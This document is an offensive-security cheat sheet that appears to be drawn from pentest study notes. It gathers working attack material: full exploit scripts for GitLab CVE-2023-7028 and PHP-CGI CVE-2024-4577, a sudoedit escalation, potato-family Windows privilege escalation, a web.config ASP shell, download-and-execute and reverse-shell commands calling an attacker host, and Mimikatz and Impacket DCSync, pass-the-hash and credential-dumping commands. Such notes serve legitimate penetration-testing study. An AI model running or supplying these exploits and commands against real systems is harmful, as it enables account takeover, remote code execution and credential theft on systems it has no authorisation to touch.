> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Second Terminal > Prerequisites`

- Sudo version needs to be ≥ 1.8 and < 1.9.12p2.
- Limited Sudo access to at least one file on the system that requires root access.


## Example

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Second Terminal > Example`

```
test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd
```


## Exploitation

> Source: `01101100-C0D3X-00110110.md` → `DCSync > CVE > Second Terminal > Exploitation`

```
EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
```
```
sudoedit /etc/motd
```
- Linux ubuntu2204 5.19.0-46-generic
```
python3 gen_libc.py 
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
```
gcc -o exp exp.c
./exp
```

> [https://github.com/V1lu0/CVE-2023-7028](https://github.com/V1lu0/CVE-2023-7028)

> [https://github.com/Vozec/CVE-2023-7028](https://github.com/Vozec/CVE-2023-7028)


## PoC

> Source: `01101100-C0D3X-00110110.md` → `DCSync > PoC`

```
user[email][]=valid@email.com&user[email][]=attacker@email.com
```
```
import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choice
from time import sleep
import re
requests.packages.urllib3.disable_warnings()

class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        self.use_temp_mail = False
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()

    def get_csrf_token(self):
        try:
            print('[DEBUG] Getting authenticity_token ...')
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text
            regex = r'<meta name="csrf-token" content="(.*?)" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None

    def ask_reset(self):
        token = self.get_csrf_token()
        if not token:
            return False

        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)

        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        print('[DEBUG] Sending reset password request')
        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           data=query_string,
                           headers=head,
                           verify=False).text
        sended = 'If your email address exists in our database' in html
        if sended:
            print(f'[DEBUG] Emails sent to {self.target} and {self.evil} !')
            print(f'Flag value: {bytes.fromhex("6163636f756e745f6861636b2364").decode()}')
        else:
            print('[DEBUG] Failed ... quitting')
        return sended

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')
    parser.add_argument("-u", "--url", dest="url", type=str, required=True, help="Gitlab url")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target email")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    exploit = CVE_2023_7028(
        url=args.url,
        target=args.target,
        evil=args.evil
    )
    if not exploit.ask_reset():
        exit()
```


## Execution

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Execution`

```
python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
```
```
"""
PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
Exploit By: Aliz (@AlizTheHax0r) and Sina Kheirkhah (@SinSinology) of watchTowr (@watchtowrcyber) 
Technical details: https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/?github
Reference: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
"""

banner = """             __         ___  ___________                   
     __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
     \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
      \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
       \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
                  \\/          \\/     \\/                            
      
        watchTowr-vs-php_cve-2024-4577.py
        (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
          - Aliz Hammond, watchTowr (aliz@watchTowr.com)
          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)
        CVEs: [CVE-2024-4577]  """

import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import argparse

print(banner)
print("(^_^) prepare for the Pwnage (^_^)\n")

parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 --target http://192.168.1.1/index.php -c "<?php system('calc')?>""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')

s = requests.Session()
s.verify = False

res = s.post(f"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data=f"{args.code};echo 1337; die;" )
if('1337' in res.text ):
    print('(+) Exploit was successful')
else:
    print('(!) Exploit may have failed')
```
```
$ curl -H "X-Middleware-Subrequest: middleware" https://<RHOST>/admin
```


## rConfig <= 3.9.4 - Modify exploit

> Source: `01101100-C0D3X-00110110.md` → `DCSync > rConfig <= 3.9.4 - Modify exploit`

- https://github.com/v1k1ngfr/exploits-rconfig
- https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2019-19509.py
```bash
# /usr/share/exploitdb/exploits/php/webapps/48208.py
# multiple exploits here, use ports open on box

- exploit_req = request.get(encoded_request)
+ exploit_req = request.get(encoded_request, verify=False)
```


## GodPotato LPE

> Source: `01101100-C0D3X-00110110.md` → `DCSync > rConfig <= 3.9.4 - Modify exploit > GodPotato LPE`

> [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

```
.\GodPotato-NET4.exe -cmd '<COMMAND>'
```

> [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

> [http://ohpe.it/juicy-potato/CLSID/](http://ohpe.it/juicy-potato/CLSID/)


## GetCLSID.ps1

> Source: `01101100-C0D3X-00110110.md` → `DCSync > rConfig <= 3.9.4 - Modify exploit > GodPotato LPE > GetCLSID.ps1`

```
<#
This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
Then exports to CSV
#>

$ErrorActionPreference = "Stop"

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT

Write-Output "Looking for CLSIDs"
$CLSID = @()
Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){
    if ($ID.appid -ne $null){
        $CLSID += $ID
    }
}

Write-Output "Looking for APIDs"
$APPID = @()
Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@{N='AppID'; E={$_.pschildname}})){
    if ($AID.LocalService -ne $null){
        $APPID += $AID
    }
}

Write-Output "Joining CLSIDs and APIDs"
$RESULT = @()
Foreach ($app in $APPID){
    Foreach ($CLS in $CLSID){
        if($CLS.AppId -eq $app.AppID){
            $RESULT += New-Object psobject -Property @{
                AppId    = $app.AppId
                LocalService = $app.LocalService
                CLSID = $CLS.CLSID
            }

            break
        }
    }
}

$RESULT = $RESULT | Sort-Object LocalService

# Preparing to Output
$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace "Microsoft ", ""
$TARGET = $OS -Replace " ","_"

# Make target folder
New-Item -ItemType Directory -Force -Path .\$TARGET

# Output in a CSV
$RESULT | Export-Csv -Path ".\$TARGET\CLSIDs.csv" -Encoding ascii -NoTypeInformation

# Export CLSIDs list
$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath ".\$TARGET\CLSID.list" -Encoding ascii

# Visual Table
$RESULT | ogv
```


## Execution

> Source: `01101100-C0D3X-00110110.md` → `DCSync > rConfig <= 3.9.4 - Modify exploit > GodPotato LPE > Execution`

```
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
```


## JuicyPotatoNG LPE

> Source: `01101100-C0D3X-00110110.md` → `DCSync > rConfig <= 3.9.4 - Modify exploit > JuicyPotatoNG LPE`

> [https://github.com/antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)

```
.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
```

> [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)

```
mysql -u root
```


## PrintSpoofer LPE

> Source: `01101100-C0D3X-00110110.md` → `DCSync > rConfig <= 3.9.4 - Modify exploit > PrintSpoofer LPE`

> [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

```
.\PrintSpoofer64.exe -i -c powershell
```


## SharpEfsPotato LPE

> Source: `01101100-C0D3X-00110110.md` → `DCSync > rConfig <= 3.9.4 - Modify exploit > SharpEfsPotato LPE`

> [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)

```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

> [https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c](https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c)


## Modifying Exploit

> Source: `01101100-C0D3X-00110110.md` → `DCSync > rConfig <= 3.9.4 - Modify exploit > SharpEfsPotato LPE > Modifying Exploit`

```
// get a FS reference from something mounted in from outside
        if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
                die("[-] open");

        if (find_handle(fd1, "/root/root.txt", &root_h, &h) <= 0)
                die("[-] Cannot find valid handle!");
```


## Compiling

> Source: `01101100-C0D3X-00110110.md` → `DCSync > rConfig <= 3.9.4 - Modify exploit > SharpEfsPotato LPE > Compiling`

```
gcc shocker.c -o shocker
gcc -Wall -std=c99 -O2 shocker.c -static
```


## Templates

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Templates`

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
```


## Bad YAML

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Templates > Bad YAML`

```
- hosts: localhost
  tasks:
    - name: badyml
      command: chmod +s /bin/bash
```


## Bash

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Wordlists > Bash`

```
for i in {1..100}; do printf "Password@%d\n" $i >> <FILE>; done
```


## CeWL

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Wordlists > CeWL`

```
cewl -d 0 -m 5 -w <FILE> http://<RHOST>/index.php --lowercase
cewl -d 5 -m 3 -w <FILE> http://<RHOST>/index.php --with-numbers
```


## crunch

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Wordlists > crunch`

```
crunch 6 6 -t foobar%%% > wordlist
crunch 5 5 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -o <FILE>.txt
```
```
javascript:(function(){const e=document.documentElement.innerText.match(/[a-zA-Z_\-]+/g),n=[...new Set(e)].sort();document.open(),document.write(n.join("<br>")),document.close();})();
```


## Mutate Wordlists

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Wordlists > Mutate Wordlists`

```
head /PATH/TO/WORDLIST/<WORDLIST> > <FILE>.txt
sed -i '/^1/d' <FILE>.txt
```


## Username Anarchy

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Wordlists > Username Anarchy`

```
./username-anarchy -f first,first.last,last,flast,f.last -i <FILE>
```

---

**Remember: Enumeration is the key. If you get stuck, step back, review your steps, and try harder.**

---


## Traversal

> Source: `01101100-C0D3X-00110110.md` → `AD > Traversal`

---

RDP

```plaintext
mstsc /admin (without disconnecting regular user)
mstsc /restrictedadmin (use current creds)
```

PTH

```plaintext
sekurlsa::pth /user:admin /domain:<domain> /ntlm:<ntlm> /run:"mstsc.exe /restrictedadmin"

sekurlsa::pth /user:admin /domain:<domain> /ntlm:<ntlm> /run:powershell
Enter-PSSession -Computer <hostname>

xfreerdp /u:admin /pth:<ntlm> /v:192.168.1.1 /cert-ignore
```

SharpRDP

```plaintext
SharpRDP.exe computername=srv command=notepad username=domain\willem password=lab
sharprdp.exe computername=srv command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=domain\willem password=lab
```

Fileless PTH

```shell
python3 scshell.py domain/user@192.168.1.1 -hashes 00000000000000000000000000000000:00000000000000000000000000000000 -service-name SensorService
```

ControlMaster

```shell
ssh -S /home/user/.ssh/controlmaster/user\@linuxvictim\:22 user@linuxvictim
```

SSH-Agent

```shell
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh user@linuxvictim
```

Ansible

```shell
ansible victims -a "whoami"
ansible victims -a "whoami" --become
```

Netexec

```shell
nxc smb 192.168.1.1 -d domain.com -u x -p h4x -x dir

--exec-method {mmcexec,wmiexec,smbexec,atexec}



# IF LOCAL
nxc rdp 192.168.243.191 -u 'dmzadmin' -p 'SlimGodhoodMope' --local-auth

```

Powershell remoting

```shell
crackmapexec winrm -d domain.com -u Administrator -p 'pass123' -x "whoami" 192.168.1.1
```

Pass the hash

```shell
crackmapexec smb 192.168.1.1 -d domain.com -u admin -H 11111111111111111111111111 -X dir
```

Use keytab of user

```shell
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
sudo chown user:user /tmp/krb5cc_minenow
ls -al /tmp/krb5cc_minenow
kdestroy
klist
export KRB5CCNAME=/tmp/krb5cc_minenow
klist
```

Use keytab with impacket

```shell
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 DOMAIN.COM/Administrator
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 DOMAIN.COM/Administrator
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.DOMAIN.COM -k -no-pass
```

---


## Mimikatz.exe DCSync krbtgt

> Source: `01101100-C0D3X-00110110.md` → `Mimikatz > Mimikatz.exe DCSync krbtgt`

```
mimikatz.exe "lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt" "exit"
```


## Mimikatz.ps1 DCSync krbtgt

> Source: `01101100-C0D3X-00110110.md` → `Mimikatz > Mimikatz.ps1 DCSync krbtgt`

```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt"'
```


## Mimikatz.ps1 DCSync all

> Source: `01101100-C0D3X-00110110.md` → `Mimikatz > Mimikatz.ps1 DCSync all`

```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /all /csv"'
```


## Mimikatz.ps1 RDP pth

> Source: `01101100-C0D3X-00110110.md` → `Mimikatz > Mimikatz.ps1 RDP pth`

```
Invoke-Mimikatz -Command "sekurlsa::pth /user:<username> /domain:<domain> /ntlm<nthash> /run:'mstsc.exe /restrictedadmin'"
```


## Mimikatz pth

> Source: `01101100-C0D3X-00110110.md` → `Mimikatz > Mimikatz pth`

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<nthash> /run:powershell.exe"'
```


## secretsdump.py DCSync using ticket

> Source: `01101100-C0D3X-00110110.md` → `Impacket > secretsdump.py DCSync using ticket`

```
impacket-secretsdump <dc_ip> -k -no-pass -just-dc
```


## secretsdump.py DCSync using hash

> Source: `01101100-C0D3X-00110110.md` → `Impacket > secretsdump.py DCSync using hash`

```
impacket-secretsdump -just-dc -hashes <hashes> <domain>/'<username>'@<dc_ip>
```


## secretsdump.py DCSync using password

> Source: `01101100-C0D3X-00110110.md` → `Impacket > secretsdump.py DCSync using password`

```
impacket-secretsdump -just-dc <hashes> <domain>/'<username>':'<password>'@<dc_ip>
```


## psexec.py psexec using password

> Source: `01101100-C0D3X-00110110.md` → `Impacket > psexec.py psexec using password`

```
impacket-psexec <domain>/'<username>':'<password>'@<hostname>
```


## psexec.py psexec using hash

> Source: `01101100-C0D3X-00110110.md` → `Impacket > psexec.py psexec using hash`

```
impacket-psexec -hashes :<nthash> <domain>/'<username>'@<hostname>
```


## winexec.py using password

> Source: `01101100-C0D3X-00110110.md` → `Impacket > winexec.py using password`

```
impacket-wmiexec <domain>/'<username>':'<password>'@<hostname>
```


## winexec.py using hash

> Source: `01101100-C0D3X-00110110.md` → `Impacket > winexec.py using hash`

```
impacket-wmiexec -hashes :6fe92d4fd19b4dd83f5f1be72079d7ef <domain>/'<username>'@<hostname>
```


## impacket add rbcd from X (new_computer) to constrained (target_computer)

> Source: `01101100-C0D3X-00110110.md` → `Impacket > impacket add rbcd from X (new_computer) to constrained (target_computer)`

```
rbcd.py -delegate-from '<new_computer>$' -delegate-to '<target_computer>$' -dc-ip <dc_ip> -action 'write' -hashes ':<new_computer_owner_nthash' <domain>/'<target_computer>$'
```


## Recon Find Unconstrained Delegation Computers

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Find Unconstrained Delegation Computers`

```
Get-DomainComputer -Unconstrained | select useraccountcontrol, name
```


## Recon Find Constrained Delegation Users

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Find Constrained Delegation Users`

```
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto,useraccountcontrol | Format-List
```


## Recon Find Constrained Delegation Computers

> Source: `01101100-C0D3X-00110110.md` → `PowerView > Recon Find Constrained Delegation Computers`

```
Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto,useraccountcontrol | Format-List
```


## Windows psexec.exe

> Source: `01101100-C0D3X-00110110.md` → `Windows > Windows psexec.exe`

```
psexec.exe -u <domain>\<username> -p <password> \\<hostname> cmd.exe
```


## PsExec.exe

> Source: `01101100-C0D3X-00110110.md` → `Windows > PsExec.exe`

```
\PsExec32.exe -accepteula -s \\<hostname> cmd
```


## xfreerdp pth

> Source: `01101100-C0D3X-00110110.md` → `xfreerdp > xfreerdp pth`

```
xfreerdp /u:<username> /d:<domain> /pth:<nthash> /v:<ip>
```
